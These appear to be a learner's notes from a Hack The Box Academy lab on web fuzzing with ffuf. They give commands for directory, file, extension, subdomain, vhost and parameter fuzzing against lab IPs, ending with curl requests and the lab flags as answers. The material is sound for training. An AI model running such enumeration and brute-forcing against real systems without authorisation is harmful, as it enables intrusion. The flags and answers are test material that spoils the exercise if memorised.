https://referral.hackthebox.com/mzwGP1b

the ffuf tool for web fuzzing, as it is one of the most common and reliable tools available for web fuzzing.

The following topics will be discussed:

    Fuzzing for directories
    Fuzzing for files and extensions
    Identifying hidden vhosts
    Fuzzing for PHP parameters
    Fuzzing for parameter values


definitions:
Fuzzing is the usually automated process of entering random data into a program and analyzing the results to find potentially exploitable bugs.

Some of the most commonly used wordlists can be found under the GitHub SecLists repository

locate directory-list-2.3-small.txt

Tip: Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following command to get rid of these lines with the -ic flag.

apt install ffuf -y

ffuf -h 
-w for word list
-u for url


we can pick our wordlist and assign the keyword FUZZ to it by adding :FUZZ after it:

┌──(kali㉿kali)-[~/Desktop/HTB_academy/Web fuzzing]
└─$ ffuf -w directory-list-2.3-small.txt:FUZZ 

ffuf -w <SNIP> -u http://SERVER_IP:PORT/FUZZ

ffuf -w directory-list-2.3-small.txt:FUZZ -u http://94.237.48.48:30787/FUZZ

found: forum && blog

locate others page types of pages the website uses, like .html, .aspx, .php, or something else.

now we use the .FUZZ and use a wordlist for extensions

Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after "index" in our fuzzing.

Now, we can rerun our command, carefully placing our FUZZ keyword where the extension would be after index:

ffuf -w web-extensions.txt:FUZZ -u http://94.237.48.48:30787/indexFUZZ

:: Progress: [41/41] :: Job [1/1] :: 5 req/sec :: Duration[Status: 200, Size: 986, Words: 423, Lines: 56, Duration: 4788ms]
    * FUZZ: .php

for fuzzing directories:
ffuf -w 
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://94.237.48.48:30787/blog/FUZZ.php

found: home.php

HTB{bru73_f0r_c0mm0n_p455w0rd5}

So far, we have been fuzzing for directories, then going under these directories, and then fuzzing for files. However, if we had dozens of directories, each with their own subdirectories and files, this would take a very long time to complete. To be able to automate this, we will utilize what is known as recursive fuzzing.

In ffuf, we can enable recursive scanning with the -recursion flag, and we can specify the depth with the -recursion-depth flag. If we specify -recursion-depth 1, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like /login/user, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with -e .php

Resume:
-recursion (enable recursivity)
-recursion-depth 1 (specify the depth)
-e (extensions)
-e .php
-v (output the full urls)


Note: we can still use `.php` as our page extension, as these extensions are usually site-wide.

site wide (troughout (in every part)) > partout dans le site

Finally, we will also add the flag -v to output the full URLs. Otherwise, it may be difficult to tell which .php file lies under which directory.

Let us repeat the first command we used, add the recursion flags to it while specifying .php as our extension, and see what results we get:

ffuf -w directory-list-2.3-small.txt:FUZZ -u http://94.237.48.48:30787/FUZZ -recursion -recursion-depth 1 -e .php -v

found:
http://94.237.48.48:30787/forum/flag.php
HTB{fuzz1n6_7h3_w3b!}

/// SUB DOMAIN: ////
Need to find sub domain on ip
find the domain
sudo sh -c 'echo "94.237.56.76  academy.htb" >> /etc/hosts'

A sub-domain is any website underlying another domain. For example, https://photos.google.com is the photos sub-domain of google.com.

subdomains-top1million-5000.txt. If we want to extend our scan, we can pick a larger list.

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb:30787/

We see that we do not get any hits back. Does this mean that there are no sub-domain under academy.htb? - No.

This means that there are no public sub-domains under academy.htb, as it does not have a public DNS record, as previously mentioned. Even though we did add academy.htb to our /etc/hosts file, we only added the main domain, so when ffuf is looking for other sub-domains, it will not find them in /etc/hosts, and will ask the public DNS, which obviously will not have them.

HackTheBox has an online Swag Shop. Try running a sub-domain fuzzing test on 'hackthebox.eu' to find it. What is the full domain of it? 

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.hackthebox.eu/

store.hackthebox.eu

Vhosts vs. Sub-domains

The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites.

This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.

To scan for VHosts, without manually adding the entire wordlist to our /etc/hosts, we will be fuzzing HTTP headers, specifically the Host: header. To do that, we can use the -H flag to specify a header and will use the FUZZ keyword within it, as follows:

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:54300/ -H 'Host: FUZZ.academy.htb'


sudo sh -c 'echo "94.237.56.76  academy.htb" >> /etc/hosts'
94.237.56.76:54300

We see that all words in the wordlist are returning 200 OK! This is expected, as we are simply changing the header while visiting http://academy.htb:PORT/. So, we know that we will always get 200 OK. However, if the VHost does exist and we send a correct one in the header, we should get a different response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.

The size of incorrect response is 986 so we need to filter it out 
with -fs 986

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:54300/ -H 'Host: FUZZ.academy.htb' -fs 986

found:
admin && test

Note 1: Don't forget to add "admin.academy.htb" to "/etc/hosts".

sudo sh -c 'echo "94.237.56.76  admin.academy.htb" >> /etc/hosts' &&
sudo sh -c 'echo "94.237.56.76  test.academy.htb" >> /etc/hosts'
94.237.56.76:54300
Note 2: If your exercise has been restarted, ensure you still have the correct port when visiting the website.

if we run a recursive ffuf scan on admin.academy.htb, we should find http://admin.academy.htb:PORT/admin/admin.php. If we try accessing this page, we see the following:

That indicates that there must be something that identifies users to verify whether they have access to read the flag. We did not login, nor do we have any cookie that can be verified at the backend. So, perhaps there is a key that we can pass to the page to read the flag. Such keys would usually be passed as a parameter, using either a GET or a POST HTTP request. This section will discuss how to fuzz for such parameters until we identify a parameter that can be accepted by the page.

Tip: Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.


GET Request Fuzzing

Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a ? symbol, like:

    http://admin.academy.htb:PORT/admin/admin.php?param1=key.

So, all we have to do is replace param1 in the example above with FUZZ and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt. With that, we can run our scan.

ffuf -w burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:54300/admin/admin.php?FUZZ=key -fs 798

found:
user

Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage? 

user


Parameter Fuzzing - POST
The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request. Check out the Web Requests module to learn more about HTTP requests.

To fuzz the data field with ffuf, we can use the -d flag, as we saw previously in the output of ffuf -h. We also have to add -X POST to send POST requests.



-d fuzz the data field
-X POST to send post requests

Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".

-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

So, let us repeat what we did earlier, but place our FUZZ keyword after the -d flag:

ffuf -w burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:54300/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 798

found:
id
try with id as parameter with curl:

curl http://admin.academy.htb:54300/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

result: Invalid id!

Value Fuzzing 
Need to create a wordlist for id bruteforcing

for i in $(seq 1 1000); do echo $i >> ids.txt; done
ids.txt are a list of all numbers from 1 to 1000

ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:54300/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768

found: 73

curl http://admin.academy.htb:54300/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'

found: HTB{p4r4m373r_fuzz1n6_15_k3y!}



Evaluation on target:

94.237.48.48:35111



Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name) 

add the ip to a host :
sudo sh -c 'echo "94.237.48.48 academy.htb" >> /etc/hosts'

ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:35111/ -H 'Host: FUZZ.academy.htb' -fs 985

result: test archive faculty

sudo sh -c 'echo "94.237.48.48 test.academy.htb" >> /etc/hosts' &&
sudo sh -c 'echo "94.237.48.48 archive.academy.htb" >> /etc/hosts' &&
sudo sh -c 'echo "94.237.48.48 faculty.academy.htb" >> /etc/hosts'


extensions fuzzing scan 

ffuf -w web-extensions.txt:FUZZ -u http://academy.htb:35111/indexFUZZ

result:  .php

ffuf -w web-extensions.txt:FUZZ -u http://test.academy.htb:35111/indexFUZZ
result: .php
ffuf -w web-extensions.txt:FUZZ -u http://archive.academy.htb:35111/indexFUZZ
result: .php
ffuf -w web-extensions.txt:FUZZ -u http://faculty.academy.htb:35111/indexFUZZ
result: .php7


dir scan

ffuf -w directory-list-2.3-small.txt:FUZZ -u http://academy.htb:35111/FUZZ

//

depth scan

ffuf -w directory-list-2.3-small.txt:FUZZ -u http://academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
result: //
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://test.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php -v
result: //
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://archive.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
result: /courses
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
result: http://faculty.academy.htb:35111/courses/linux-security.php7

94.237.62.195:41768
http://faculty.academy.htb:41768/courses/linux-security.php7

find parameters:

ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7?FUZZ=key -fs 774

found:
user

ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774

found:
user
username

Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag? 

try with a wordlist of common username or id

ffuf -w directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781

found:
http://faculty.academy.htb:41768/courses/linux-security.php7?username=harry

curl http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'

result: HTB{w3b_fuzz1n6_m4573r}

You have just completed the Attacking Web Applications with Ffuf module!
